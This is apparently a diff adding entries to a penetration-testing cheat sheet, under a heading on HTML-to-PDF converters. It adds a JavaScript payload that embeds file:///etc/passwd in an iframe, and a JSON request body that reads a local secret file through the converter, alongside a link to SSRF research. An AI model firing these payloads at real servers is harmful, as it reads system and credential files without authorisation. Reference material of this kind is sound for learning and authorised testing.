@@ -584,6 +584,14 @@ Content-Length: 0
 
 ### HTML to PDF  
 
+>Identify file download HTML-to-PDF convert function on target is vulnerable.  
+
+```JavaScript
+<script>
+	document.write('<iframe src=file:///etc/passwd></iframe>');
+</script>
+```  
+
 >Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
 [PortSwigger Research HTML-to-PDF converters vuln to SSRF](https://portswigger.net/daily-swig/html-to-pdf-converters-open-to-denial-of-service-ssrf-directory-traversal-attacks)
@@ -603,6 +611,14 @@ Content-Length: 0
   </script>
  </body>
 </html>
+```  
+
+>JSON POST request body containing the HTMLtoPDF formatted payload to read local file.  
+
+```JSON
+{
+"html-data":"<div><p>Report Heading</p><iframe src="file:///home/carlos/secret" height="500" width="500">[..]
+}
 ```  
 
 >Random notes on HTML-to-PDF converters & SSRF  
